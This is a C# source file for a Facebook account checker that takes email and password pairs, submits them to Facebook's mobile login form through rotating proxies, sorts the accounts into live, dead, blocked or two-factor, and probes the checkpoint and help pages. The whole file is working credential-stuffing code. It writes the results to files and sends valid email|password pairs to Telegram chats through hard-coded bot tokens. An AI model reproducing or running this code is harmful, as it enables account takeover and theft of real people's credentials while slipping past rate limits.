using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection.Metadata;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;
using Telegram.Bot;
using Telegram.Bot.Types;
using Newtonsoft.Json;
using System.Net.Http.Headers;
using System.Xml;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace ConsoleApp2
{
    class Login
    {
        public delegate void callBack(int state);
        private string email;
        private string password;
        private string userAgent;
        private string cookies;
        private HttpClientHandler httpClientHandler;
        private int idThread;
        private string generalPath;

        public Login() { }
        public Login(string email, string password, string? userAgent, string? cookies, HttpClientHandler httpClientHandler,string generalPath, int idThread)
        {
            this.email = email;
            this.password = password;
            this.userAgent = userAgent;
            this.cookies = cookies;
            this.httpClientHandler = httpClientHandler;
            this.idThread = idThread;
            this.generalPath = generalPath;
        }

        public async Task<HttpResponseMessage> getLogin(HttpClientHandler httpClientHandler, string? cookie, string? userAgent, int idThread)
        {
            try
            {
                HttpClient httpClient = new HttpClient(httpClientHandler);
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                string url = "https://d.facebook.com/";
                httpClient.DefaultRequestHeaders.Add("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
                httpClient.DefaultRequestHeaders.Add("accept-language", "en-US,en;q=1");
                httpClient.DefaultRequestHeaders.Add("sec-fetch-site", "none");
                //httpClient.DefaultRequestHeaders.Add("Connection", "keep-alive");
                //  httpClient.DefaultRequestHeaders.Add("authority", "mbasic.facebook.com");
                //  httpClient.DefaultRequestHeaders.Add("scheme", "https");
                //httpClient.DefaultRequestHeaders.Add("cookie", cookie);
                //httpClient.DefaultRequestHeaders.Add("Host", "d.facebook.com");
                httpClient.DefaultRequestHeaders.Add("user-agent", userAgent);
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
                HttpResponseMessage response = httpClient.SendAsync(request).GetAwaiter().GetResult();
                string responseBody = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                return response;
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("Insite GET", ex.Message);
                return null;
                // await getLogin(httpClientHandler, cookie, userAgent, idThread);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Insite GET", ex.Message);
                return null;
                // await getLogin(httpClientHandler, cookie, userAgent, idThread);
            }

            return null;
        }


        public async Task<HtmlDocument> doc(HttpResponseMessage response)
        {
            try
            {
                if (response != null)
                {
                    HtmlDocument document = new HtmlDocument();
                    string responseBody = await response.Content.ReadAsStringAsync();
                    document.LoadHtml(responseBody);
                    return document;
                }
                else return null;

            }
            catch (NullReferenceException ex)
            {
                Console.WriteLine("Lỗi: " + ex.Message);
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Inside DOC: " + response);
                return null;
            }
            return null;
        }

        public string coookieColdP(HttpResponseMessage response, string cookieDatr)
        {
            try
            {
                string cookieSb = "";
                if (response.Headers.TryGetValues("Set-Cookie", out var setCookieValues))
                {
                    foreach (string cookies in setCookieValues)
                    {
                        cookieSb = cookies.Split(';')[0];
                    }
                }
                string cookieStr = $"{cookieDatr};{cookieSb}";
                return cookieStr;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Cookie");
                return null;

            }


        }
        private string cookie(HttpResponseMessage response)
        {
            try
            {
                string[] cookieDatrArr;
                string[] cookieSbArr;
                List<string> cookiesArr = new List<string>();
                if (response.Headers.TryGetValues("Set-Cookie", out var setCookieValues))
                {
                    foreach (var cookie in setCookieValues)
                    {
                        cookiesArr.Add(cookie);
                    }

                }
                cookieSbArr = cookiesArr[1].Split(";", StringSplitOptions.RemoveEmptyEntries);
                cookieDatrArr = cookiesArr[0].Split(";", StringSplitOptions.RemoveEmptyEntries);
                string datr = cookieDatrArr[0];
                string sb = cookieSbArr[0];
                string cookies = $"{datr};{sb}";
                return cookies;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Cookie");
                return null;
            }

        }

        private string cookieTest(HttpResponseMessage response, string cookieDatr)
        {
            string[] cookieSbArr;
            List<string> cookiesArr = new List<string>();
            if (response.Headers.TryGetValues("Set-Cookie", out var setCookieValues))
            {
                foreach (var cookie in setCookieValues)
                {
                    cookiesArr.Add(cookie);
                }

            }
            cookieSbArr = cookiesArr[0].Split(";", StringSplitOptions.RemoveEmptyEntries);
            string sb = cookieSbArr[0];
            string cookies = $"{cookieDatr};{sb}";
            return cookies;
        }

        private string cookiesPost(HttpResponseMessage response, string cookieLogin)
        {

            List<string> cookiesArr = new List<string>();
            if (response.Headers.TryGetValues("Set-Cookie", out var setCookieValues))
            {
                foreach (var cookie in setCookieValues)
                {
                    cookiesArr.Add(cookie);
                }
                string[] cookieCheckPoint = cookiesArr[0].Split(";", StringSplitOptions.RemoveEmptyEntries);
                string cookieStr = $"{cookieLogin};{cookieCheckPoint[0]}";
                return cookieStr;
            }
            else
                return null;
        }

        public delegate void MyDelegate();
        public StringContent payLoad(HtmlDocument document, string username, string password)
        {
            if (document != null)
            {
                try
                {
                    HtmlNode lsdD = document.DocumentNode.SelectSingleNode("//input[@name='lsd']");
                    HtmlNode jazoestD = document.DocumentNode.SelectSingleNode("//input[@name='jazoest']");
                    HtmlNode m_tsD = document.DocumentNode.SelectSingleNode("//input[@name='m_ts']");
                    HtmlNode liD = document.DocumentNode.SelectSingleNode("//input[@name='li']");

                    if (lsdD != null && jazoestD != null && m_tsD != null && liD != null)
                    {
                        string lsd = lsdD.Attributes["value"].Value;
                        string jazoest = jazoestD.Attributes["value"].Value;
                        string m_ts = m_tsD.Attributes["value"].Value;
                        string li = liD.Attributes["value"].Value;
                        string try_number = "0";
                        string unrecognized_tries = "0";
                        string email = username;
                        string pass = password;
                        string login = "Log In";
                        string bi_xrwh = "0";
                        string payloadStr = $"lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number=0&unrecognized_tries=0&email={email}&pass={pass}&login=Log+In&bi_xrwh=0";
                        var content = new StringContent(payloadStr, Encoding.UTF8, "application/x-www-form-urlencoded");
                        return content;
                    }
                    else return null;

                }
                catch (Exception ex)
                {
                    Console.WriteLine("co loi");
                    return null;
                }
            }
            else
            {
                return null;
            }

        }


        public async Task<HttpResponseMessage> postLogin(HttpClientHandler httpClientHandler, StringContent content, string cookies, string? userAgent)
        {
            try
            {
                string urlPost = "https://d.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8";
                HttpClient httpClientPost = new HttpClient(httpClientHandler);
                httpClientPost.Timeout = TimeSpan.FromSeconds(10);
                httpClientPost.DefaultRequestHeaders.Add("authority", "d.facebook.com");
                httpClientPost.DefaultRequestHeaders.Add("scheme", "https");
                httpClientPost.DefaultRequestHeaders.Add("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
                httpClientPost.DefaultRequestHeaders.Add("accept-language", "en-US,en;q=1");
                httpClientPost.DefaultRequestHeaders.Add("cache-control", "max-age=0");
                httpClientPost.DefaultRequestHeaders.Add("cookie", cookies);
                httpClientPost.DefaultRequestHeaders.Add("origin", "https://d.facebook.com");
                httpClientPost.DefaultRequestHeaders.Add("referer", "https://d.facebook.com/");
                httpClientPost.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                //httpClientPost.DefaultRequestHeaders.Add("sec-fetch-user", "?1");
                //httpClientPost.DefaultRequestHeaders.Add("upgrade-insecure-requests", "1");
                httpClientPost.DefaultRequestHeaders.Add("user-agent", userAgent);
                var resPost = await httpClientPost.PostAsync(urlPost, content);

                return resPost;
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("Disconnect");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Insite POST", ex.Message);
                return null;

            }
            return null;
        }


        async public Task rotationIp(string id, string key, HttpClientHandler httpClientHandler)
        {
            try
            {
                HttpClient httpClient = new HttpClient(httpClientHandler);
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                string url = $"https://coldproxy.com/clients/modules/servers/proxypanel/api.php?id={id}&key={key}&a=rotate";

                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
                HttpResponseMessage response = httpClient.SendAsync(request).GetAwaiter().GetResult();
                string responseBody = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                Console.WriteLine(response);
            }
            catch (HttpRequestException ex)
            {
            }
            catch (Exception ex)
            {

            }
        }

        async Task<bool> filterText(HtmlDocument document ,string text)
        {
            try
            {
                HtmlNodeCollection textNodes = document.DocumentNode.SelectNodes($"//*[contains(text(),'${text}')]");
                int isHas = 0;
                if (textNodes != null)
                {
                    if (textNodes.Count > 0)
                    {
                        return true;
                    }
                }else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                return false;
            }
            return false;
        }

        async Task<bool>isStr(string html,string text){
            
            if(html.IndexOf(text) != -1){
                return true;
            }else
            return false;
        }
        async Task<string> checkLogin(HtmlDocument document, HttpResponseMessage response)
        {
            try
            {
                string html = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                string resetStr = "Reset Your Password";
                string blockStr = "You’re Temporarily Blocked";
                string forgotStr = "Have you forgotten your password?";
                string epsilon = "Epsilon";
                string invalid  = "Invalid username or password";
                string oldPass = "You used an old password";
                string loginCode = "Enter login code to continue";
                string forgetStr = "Did you forget your password?";



                bool isReset =await filterText(document, resetStr);
                bool isBlock = await filterText(document, blockStr);
                bool isForgot = await filterText(document, forgotStr);
                bool isEpsilon = await filterText(document, epsilon);
                bool isInvalid = await filterText(document, invalid);
                bool isOldPass = await filterText(document, oldPass);
                bool isLoginCode = await filterText(document, loginCode);
                bool isForget = await filterText(document, forgetStr);    

                bool isDeath = await isStr(html,resetStr);
                bool isInvalids = await isStr(html,invalid);   
                bool isOlds = await isStr(html,oldPass);  

                HtmlNode errId = document.GetElementbyId("login_error");
                HtmlNode und = document.GetElementbyId("login_form");
                HtmlNode checkpoint = document.GetElementbyId("checkpointSubmitButton");
                HtmlNode checkpoint_title = document.GetElementbyId("checkpoint_title");
                HtmlNode indentify = document.DocumentNode.SelectSingleNode("//a[@href='/login/identify/']");
                HtmlNode incorrect = document.DocumentNode.SelectSingleNode("//a[@aria-label='Have you forgotten your password?']");
                HtmlNode initiate = document.DocumentNode.SelectSingleNode("//a[@href='/recover/initiate/?ars=facebook_login_pw_error']");
                HtmlNode resetPass = document.DocumentNode.SelectSingleNode("//div[@title='Reset Your Password']");
                HtmlNode block = document.DocumentNode.SelectSingleNode("//div[@title='You’re Temporarily Blocked']");
                HtmlNode titleNode = document.DocumentNode.SelectSingleNode("//title");
                HtmlNode live = document.DocumentNode.SelectSingleNode("//form[@method='post' and @action='/login/checkpoint/']");
                response.Headers.TryGetValues("Set-Cookie", out var setCookieValues);

                if (isForget == true) return "die";
                if (isReset == true) return "die";
                if (isForgot == true) return "die";
                if (isInvalid == true) return "die";
                if (isOldPass == true) return "die";
                if (isEpsilon == true) return "die";
                if (isLoginCode == true) return "live";
                if (isBlock) return "block";
                if (checkpoint != null) return "live";
                if (isDeath == true) return "die";
                if(isInvalids == true ) return "die";
                if(isOlds == true) return "die";

                if (setCookieValues != null)
                {
                    foreach (var cookie in setCookieValues)
                    {
                        if (cookie.IndexOf("checkpoint") != -1)
                        {
                            return "live";
                        }
                        else if (cookie.IndexOf("m_page_voice") != -1)
                        {
                            if (titleNode != null)
                            {
                                string title = titleNode.InnerHtml;
                                if (title == "Epsilon")
                                {
                                    return "die";
                                }
                                else {
                                    Console.WriteLine("***************** m_page_voice Redirecting ****************");
                                    return "LiveForward";
                                } 
                            }

                        }
                    }
                }else if(setCookieValues == null)
                {
                    return "die";
                }
                else if (live != null)
                {
                    return "live";
                }
                else if (indentify != null || resetPass != null || incorrect != null || initiate != null || und != null)
                {
                    return "die";
                }
                else if (titleNode != null)
                {
                    string title = titleNode.InnerHtml;
                    if (title == "You’re Temporarily Blocked")
                    {
                        return "block";
                    }
                    else if (title == "Reset Your Password")
                    {
                        return "die";
                    }
                    else if (title == "Epsilon")
                    {
                        return "die";
                    }
                }
                else if (errId != null)
                {
                    HtmlNodeCollection die = errId.SelectNodes(".//div");
                    foreach (HtmlNode node in die)
                    {
                        if (node.InnerText == "Invalid username or password")
                        {
                            return "die";
                        }
                        else if (node.InnerText.IndexOf("You used an old password") != -1)
                        {
                            return "die";
                        }
                    }
                }
                else if (setCookieValues == null)
                {
                    return "die";
                }
                return "undefined";
            }
            catch (Exception ex)
            {
                Console.WriteLine("********* Inside checkLogin *********");
                return "undefined";
            }
            
        }

        public string check2FA(HtmlDocument document)
        {
            HtmlNode phoneElement = document.DocumentNode.SelectSingleNode("//input[@value='no_phone_access']");
            if (phoneElement != null)
            {
                return "live2FA";
            }
            else
                return "live2FANF";
        }

        public async Task<HttpResponseMessage> request2FA(HttpClientHandler httpClientHandler, string cookies, string? userAgent)
        {
            try
            {
                string url2FA = "https://d.facebook.com/checkpoint/?having_trouble=1";
                HttpClient httpClient = new HttpClient(httpClientHandler);
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                httpClient.DefaultRequestHeaders.Add("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
                httpClient.DefaultRequestHeaders.Add("accept-language", "en-US,en;q=0.9");
                httpClient.DefaultRequestHeaders.Add("sec-fetch-site", "same-origin");
                httpClient.DefaultRequestHeaders.Add("authority", "d.facebook.com");
                httpClient.DefaultRequestHeaders.Add("scheme", "https");
                httpClient.DefaultRequestHeaders.Add("cookie", cookies);
                httpClient.DefaultRequestHeaders.Add("user-agent", userAgent);
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url2FA);
                HttpResponseMessage response = httpClient.SendAsync(request).GetAwaiter().GetResult();
                string responseBody = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                return response;
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("Disconnect2FA");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine(" ******* Insite POST2FA ********* ", ex.Message);
                return null;

            }
        }

        public string getUID(HttpResponseMessage response)
        {
            try
            {
                List<string> cookiesArr = new List<string>();
                if (response.Headers.TryGetValues("Set-Cookie", out var setCookieValues))
                {
                    foreach (var cookie in setCookieValues)
                    {
                        cookiesArr.Add(cookie);
                    }
                    string[] cookieCheckPoint = cookiesArr[0].Split(";", StringSplitOptions.RemoveEmptyEntries);
                    string cookieCheckPointStr = cookieCheckPoint[0].Replace("checkpoint=", "");
                    int posStart = 13;
                    var posEnd = cookieCheckPointStr.IndexOf("%", posStart);
                    string UID = cookieCheckPointStr.Substring(posStart, posEnd - posStart);
                    return UID;
                }
                else return "";

            }
            catch (Exception ex)
            {
                return "";
            }

        }

        public async Task<HttpResponseMessage> getPage(HttpClientHandler httpClientHandler, string cookies, string? userAgent)
        {
            try
            {
                string urlCheckPage = "https://www.facebook.com/help/contact/691107460987854";
                HttpClient httpClient = new HttpClient(httpClientHandler);
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                httpClient.DefaultRequestHeaders.Add("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
                httpClient.DefaultRequestHeaders.Add("accept-language", "en-US,en;q=0.9");
                httpClient.DefaultRequestHeaders.Add("sec-fetch-site", "none");
                //httpClient.DefaultRequestHeaders.Add("authority", "mbasic.facebook.com");
                httpClient.DefaultRequestHeaders.Add("scheme", "https");
                httpClient.DefaultRequestHeaders.Add("cookie", cookies);
                httpClient.DefaultRequestHeaders.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36");
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, urlCheckPage);
                HttpResponseMessage response = httpClient.SendAsync(request).GetAwaiter().GetResult();
                return response;
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("Disconnect2FA");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Insite GetPage", ex.Message);
                return null;

            }
        }

        public async Task<string> checkPage(string PageBody)
        {
            try
            {
                List<int> startPoints = new List<int> { };
                string str = "{\"__html\":\"\\u003Cdiv>";
                var pos = PageBody.IndexOf(str);
                if (pos != -1)
                {
                    while (pos != -1)
                    {
                        startPoints.Add(pos);
                        pos = PageBody.IndexOf(str, pos + 1);
                    }
                    List<int> endPoints = new List<int> { };
                    foreach (int startPoint in startPoints)
                    {
                        int point = PageBody.IndexOf("}", startPoint);
                        endPoints.Add(point);
                    }
                    List<string> arrStr = new List<string> { };
                    for (int i = 0; i < startPoints.Count; i++)
                    {
                        string page = PageBody.Substring(startPoints[i], endPoints[i] - startPoints[i] + 1);
                        arrStr.Add(page);
                    }
                    string pageMess = "";
                    string downLine = "\n";
                    int count = 0;
                    foreach (string item in arrStr)
                    {
                        if (count == arrStr.Count - 1)
                        {
                            downLine = "";
                        }
                        dynamic json = JsonConvert.DeserializeObject(item);
                        string htmlContent = json.__html;
                        string cutDiv1 = htmlContent.Replace("<div>", "");
                        string newStr = cutDiv1.Replace("</div>", "|");
                        pageMess = pageMess + newStr + downLine;
                        count++;


                    }
                    return pageMess;
                }
                else return "";
            }
            catch (Exception ex)
            {
                Console.WriteLine("***** Inside checkPage *****");
                return "";
            }
        }

        public void writerBan()
        {
            string path = $"{generalPath}checkLog.txt";
            using (StreamWriter writer = new StreamWriter(path, false))
            {
                writer.Write("1");
            }
        }

        public async Task sendMessage(string message)
        {
            try
            {
                var botClient = new TelegramBotClient("6249297912:AAHarWCxwDRVlmej98EE4R6gqyXOFTFg5CA");

                var chatId = new Telegram.Bot.Types.ChatId("-885764171");

                await botClient.SendTextMessageAsync(chatId, message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("***** Inside mess *****");
            }

        }

        public async Task sendError(string message)
        {
            try
            {
                var botClient = new TelegramBotClient("6108844689:AAGfmjr4pWeggysbB3wI_9uvw3SKi4dwKHU");

                var chatId = new Telegram.Bot.Types.ChatId("-936160804");

                await botClient.SendTextMessageAsync(chatId, message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("***** Inside mess *****");
            }

        }
        public void exportData(string check, string email, string password, int idThread)
        {
            try
            {
                if (check == "undefined")
                {
                    string filePathx = $"{generalPath}undefined.txt";
                    //  string filePath = $"C:\\Users\\Pc\\source\\repos\\ConsoleApp1\\ConsoleApp1\\undefined{idThread}.txt";
                    string contentU = $"{email}:{password}";
                    using (StreamWriter writer = System.IO.File.AppendText(filePathx))
                    {
                        writer.WriteLine(contentU);
                    }
                }
                else
                {
                    string filePath = $"{generalPath}{check}{idThread}.txt";
                    //   string filePath = $"C:\\Users\\Pc\\source\\repos\\ConsoleApp1\\ConsoleApp1\\die{idThread}.txt";
                    string content = $"{email}:{password}";
                    using (StreamWriter writer = System.IO.File.AppendText(filePath))
                    {
                        writer.WriteLine(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error Exp");
            }

        }
        public async Task main()
        {
            try
            {
                while (true)
                {
                    HttpResponseMessage resGet = await getLogin(httpClientHandler, cookies, userAgent, idThread);
                    // var responseGet = await resGet.Content.ReadAsStringAsync();
                    if (resGet != null)
                    {
                        HtmlDocument documentGet = await doc(resGet);
                        HtmlNode titleNode = documentGet.DocumentNode.SelectSingleNode("//title");
                        if (titleNode != null)
                        {
                            string title = titleNode.InnerHtml;
                            if (title == "You’re Temporarily Blocked")
                            {
                                /// block call api or igone
                                
                                Console.WriteLine("Block getLogin IP");
                                
                                writerBan();
                                exportData("block", email, password, idThread);
                                string dieM = $" **** BLOCK GET LOGIN ****  Thread:{idThread} ==>> PC";
                                await sendError(dieM);
                                break;
                            }
                        }
                        StringContent content = payLoad(documentGet, email, password);

                        //string cookieStr = coookieColdP(resGet, cookies);

                        string cookieStr = cookie(resGet);
                        /*string cookieStr = cookieTest(resGet, cookies);*/

                        if (content != null && cookieStr != null)
                        {
                            HttpResponseMessage resPost = await postLogin(httpClientHandler, content, cookieStr, userAgent);
                            if (resPost != null)
                            {
                                var responseContent = await resPost.Content.ReadAsStringAsync();
                                HtmlDocument documentPost = await doc(resPost);

                                string status =await checkLogin(documentPost, resPost);
                                if (status == "undefined")
                                {
                                  //  Console.WriteLine(responseContent);
                                }
                                if (status == "live")
                                {
                                    string isLive = $" Account live {email}|{password}|{status} Thread:{idThread} ==>> NP1";
                                    await sendError(isLive);
                                    HtmlNode troubleElement = documentPost.DocumentNode.SelectSingleNode("//a[@href='https://d.facebook.com/checkpoint/?having_trouble=1']");
                                    HtmlNodeCollection textNodes = documentPost.DocumentNode.SelectNodes("//*[contains(text(),'Having trouble?')]");
                                    int isHavingT = 0;
                                    if(textNodes != null)
                                    {
                                        isHavingT = textNodes.Count;
                                    }    
                                    
                                    if (troubleElement != null || isHavingT > 0)
                                    {
                                        string messErrorG = $" Have a account 2FA {email}|{password}| Thread : {idThread} ==>>  2FA NP1";
                                        Console.WriteLine(messErrorG);
                                        await sendError(messErrorG);
                                        string cookieCheckPointStr = cookiesPost(resPost, cookieStr);
                                        string uId = getUID(resPost);
                                        HttpResponseMessage res2Fa = await request2FA(httpClientHandler, cookieCheckPointStr, userAgent);
                                        if (res2Fa != null)
                                        {
                                            HtmlDocument document2Fa = await doc(res2Fa);
                                            string statusLive = check2FA(document2Fa);
                                            status = statusLive;
                                            HttpResponseMessage resPage = await getPage(httpClientHandler, cookieCheckPointStr, userAgent);
                                            if (statusLive == "live2FA")
                                            {
                                                if (resPage != null)
                                                {
                                                    string resPageBody = resPage.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                                                    string pageMess = await checkPage(resPageBody);
                                                    string message = $"{email}|{password}|{pageMess} ==>> ( {uId} ) 2FA NP1";
                                                    Console.WriteLine(message);
                                                    await sendMessage(message);
                                                }else
                                                {
                                                    string message = $"{email}|{password}| NON-CHECK-PAGE ==>> ( {uId} ) 2FA NP1";
                                                    Console.WriteLine(message);
                                                    await sendMessage(message);
                                                }
                                            }
                                            else
                                            {
                                                if (resPage != null)
                                                {
                                                    string resPageBody = resPage.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                                                    string pageMess = await checkPage(resPageBody);

                                                    string message = $"{email}|{password}|{pageMess} ==>> ( {uId} ) 2FA-NONF  NP1";
                                                    Console.WriteLine(message);
                                                    await sendMessage(message);
                                                }
                                                else
                                                {
                                                    string message = $"{email}|{password}| NON-CHECK-PAGE ==>> ( {uId} ) 2FA NP1";
                                                    Console.WriteLine(message);
                                                    await sendMessage(message);
                                                }
                                            }
                                        }
                                        else
                                        {
                                            status = "live2FANF";
                                            string message = $"{email}|{password}| ==>> ( {uId} ) 2FA-NONCHECK  NP1";
                                            Console.WriteLine(message);
                                            await sendMessage(message);
                                        }

                                    }
                                }
                                else if (status == "LiveForward")
                                {
                                    string message = $"{email}|{password}| ==>> LiveForward";
                                    await sendMessage(message);
                                }
                                Console.WriteLine(email + ":" + password + "  " + status);
                                exportData(status, email, password, idThread);

                                if (status == "block")
                                {
                                    
                                    writerBan();
                                    string dieM = $" **** BLOCK **** {email}|{password}|{status} Thread: {idThread} ==>> NP1";
                                    await sendError(dieM);
                                }
                                break;
                            }
                            else
                            {
                                Console.WriteLine("reload main: postLogin ");
                                /*string errorPost = $"Error Post | {email}|{password}| Thread: {idThread} ==>> PC";
                                await sendError(errorPost);*/
                                continue;
                            }
                        }
                        else
                        {
                            Console.WriteLine(" Dont have Cookie ");
                            
                            exportData("block", email, password, idThread);
                            /*string cookieM = $" **** COOKIE WAS NULL ****  Thread:{idThread} ==>> PC";
                            await sendError(cookieM);*/
                            break;
                        };
                    }
                    else
                    {
                        Console.WriteLine("reload main: getLogin " + email + password);
                        
                        exportData("block", email, password, idThread);
                        /*string errorGet = $"Error Get Thread:{idThread} ==>> PC";
                        await sendError(errorGet);*/
                        break;
                    }
                }

            }
            catch (NullReferenceException ex)
            {
                Console.WriteLine("Lỗi: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" + ex.Message);
            }
            catch (Exception e)
            {
                Console.WriteLine("Outsite " + e.Message);
                exportData("block", email, password, idThread);
            }
        }
    }
}
